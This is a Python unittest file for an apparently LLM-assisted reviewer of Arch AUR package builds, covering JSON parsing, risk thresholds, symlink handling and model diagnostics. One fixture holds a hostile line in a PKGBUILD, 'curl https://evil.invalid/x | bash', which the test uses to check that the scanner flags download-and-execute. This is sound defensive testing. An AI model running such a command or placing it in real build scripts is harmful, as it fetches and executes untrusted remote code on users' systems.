#!/usr/bin/env python3
from __future__ import annotations

import importlib.machinery
import importlib.util
import json
import os
import subprocess
import tempfile
import unittest
import sys
from pathlib import Path
from unittest.mock import patch

ROOT = Path(__file__).resolve().parent
SCRIPT = ROOT / "yay-llm-review"
loader = importlib.machinery.SourceFileLoader("yay_llm_review", str(SCRIPT))
spec = importlib.util.spec_from_loader(loader.name, loader)
module = importlib.util.module_from_spec(spec)
sys.modules[spec.name] = module
assert spec.loader is not None
spec.loader.exec_module(module)


class ReviewTests(unittest.TestCase):
    def test_endpoint_normalization(self) -> None:
        self.assertEqual(
            module.normalize_chat_endpoint("http://localhost:8080"),
            "http://localhost:8080/v1/chat/completions",
        )
        self.assertEqual(
            module.normalize_chat_endpoint("http://localhost:8080/v1"),
            "http://localhost:8080/v1/chat/completions",
        )
        self.assertEqual(
            module.normalize_chat_endpoint("http://localhost:8080/v1/chat/completions"),
            "http://localhost:8080/v1/chat/completions",
        )

    def test_model_json_fence(self) -> None:
        review = {
            "risk_level": "safe",
            "confidence": 0.9,
            "summary": "No suspicious behavior.",
            "recommended_action": "allow",
            "findings": [],
        }
        parsed = module.parse_json_content("```json\n" + json.dumps(review) + "\n```")
        self.assertEqual(module.validate_review(parsed)["risk_level"], "safe")

    def test_model_non_json_error_includes_response_preview(self) -> None:
        with self.assertRaisesRegex(module.ReviewError, "JSON object.*starts 'I cannot"):
            module.parse_json_content("I cannot provide the requested JSON response.")

    def test_incomplete_model_json_error_includes_start_and_end(self) -> None:
        with self.assertRaisesRegex(module.ReviewError, "incomplete JSON.*starts.*ends"):
            module.parse_json_content('{"risk_level": "high"')

    def test_invalid_model_json_error_includes_error_context(self) -> None:
        with self.assertRaisesRegex(module.ReviewError, "invalid JSON returned.*near"):
            module.parse_json_content('{"summary": "unescaped " quote"}')

    def test_response_finish_reason(self) -> None:
        self.assertEqual(
            module.response_finish_reason({"choices": [{"finish_reason": "length"}]}),
            "length",
        )
        self.assertIsNone(module.response_finish_reason({"choices": [{}]}))

    def test_system_prompt_defines_safe_and_low_risk_levels(self) -> None:
        self.assertIn("safe: no concrete suspicious behavior", module.SYSTEM_PROMPT)
        self.assertIn("low: a concrete, minor, review-worthy concern", module.SYSTEM_PROMPT)
        self.assertIn("Never create a finding just to explain why code is safe", module.SYSTEM_PROMPT)
        self.assertIn("A non-safe risk level requires at least one finding", module.SYSTEM_PROMPT)
        self.assertIn("System instructions and interpretation notes", module.SYSTEM_PROMPT)
        self.assertIn("evidence. Do not cite them", module.SYSTEM_PROMPT)
        self.assertIn("valid JSON", module.SYSTEM_PROMPT)
        self.assertIn("escaping for quotes, backslashes, and newlines", module.SYSTEM_PROMPT)

    def test_status_threshold(self) -> None:
        config = module.merge_config({"block_threshold": "high"})
        base = {
            "confidence": 0.8,
            "summary": "x",
            "recommended_action": "inspect",
            "findings": [],
        }
        self.assertEqual(module.status_from_review({**base, "risk_level": "medium"}, config), "WARN")
        self.assertEqual(module.status_from_review({**base, "risk_level": "high"}, config), "BLOCK")
        self.assertEqual(module.status_from_review({**base, "risk_level": "uncertain"}, config), "WARN")

    def test_default_max_tokens_allows_detailed_model_reviews(self) -> None:
        self.assertEqual(module.merge_config({})["max_tokens"], 4096)

    def test_static_pipe_to_shell(self) -> None:
        files = (module.PackageFile("PKGBUILD", "prepare() { curl https://evil.invalid/x | bash; }"),)
        findings = module.static_findings(files)
        self.assertTrue(any(item["category"] == "download-and-execute" for item in findings))

    def test_collect_does_not_follow_symlink(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            (root / "PKGBUILD").write_text("pkgname=x\npkgver=1\npkgrel=1\narch=('any')\n", encoding="utf-8")
            (root / "outside").write_text("secret", encoding="utf-8")
            subprocess.run(["git", "init", "-q", str(root)], check=True)
            os.symlink("../outside", root / "link")
            subprocess.run(["git", "-C", str(root), "add", "PKGBUILD", "link"], check=True)
            files = module.collect_files(root, module.merge_config({}))
            link = next(item for item in files if item.path == "link")
            self.assertEqual(link.content, "")
            self.assertEqual(link.symlink_target, "../outside")

    def test_init_is_idempotent(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            env = dict(os.environ)
            env["XDG_CONFIG_HOME"] = str(Path(directory) / "config")
            env["XDG_CACHE_HOME"] = str(Path(directory) / "cache")
            subprocess.run([str(SCRIPT), "init"], check=True, env=env, stdout=subprocess.PIPE, text=True)
            subprocess.run([str(SCRIPT), "init"], check=True, env=env, stdout=subprocess.PIPE, text=True)
            init_lua = Path(env["XDG_CONFIG_HOME"]) / "yay" / "init.lua"
            content = init_lua.read_text(encoding="utf-8")
            self.assertEqual(content.count(module.MANAGED_BEGIN), 1)

    def test_model_diagnostics_check_benign_and_suspicious_recipes(self) -> None:
        config = module.merge_config({"model": "test-model"})
        benign_review = {
            "risk_level": "safe",
            "confidence": 0.9,
            "summary": "Normal package build.",
            "recommended_action": "allow",
            "findings": [],
        }
        suspicious_review = {
            "risk_level": "low",
            "confidence": 0.9,
            "summary": "Suspicious package build.",
            "recommended_action": "allow",
            "findings": [],
        }
        reviews = [benign_review] + [suspicious_review] * (len(module.DIAGNOSTIC_CASES) - 1)

        with patch.object(module, "call_model", side_effect=reviews) as call_model:
            results = module.run_model_diagnostics(config)

        self.assertEqual(len(results), len(module.DIAGNOSTIC_CASES))
        self.assertTrue(all(result.passed for result in results))
        self.assertEqual(call_model.call_count, len(module.DIAGNOSTIC_CASES))

    def test_model_diagnostics_reject_an_allowed_suspicious_recipe(self) -> None:
        config = module.merge_config({"model": "test-model"})
        allowed_review = {
            "risk_level": "safe",
            "confidence": 0.9,
            "summary": "No issues.",
            "recommended_action": "allow",
            "findings": [],
        }

        with patch.object(module, "call_model", return_value=allowed_review):
            results = module.run_model_diagnostics(config)

        self.assertTrue(results[0].passed)
        self.assertFalse(all(result.passed for result in results[1:]))

    def test_model_diagnostics_reject_low_risk_benign_recipe(self) -> None:
        config = module.merge_config({"model": "test-model"})
        low_review = {
            "risk_level": "low",
            "confidence": 0.9,
            "summary": "Minor concern.",
            "recommended_action": "allow",
            "findings": [],
        }

        with patch.object(module, "call_model", return_value=low_review):
            results = module.run_model_diagnostics(config)

        self.assertFalse(results[0].passed)

    def test_test_command_accepts_verbose(self) -> None:
        args = module.build_parser().parse_args(["test", "--verbose"])
        self.assertTrue(args.verbose)


if __name__ == "__main__":
    unittest.main()
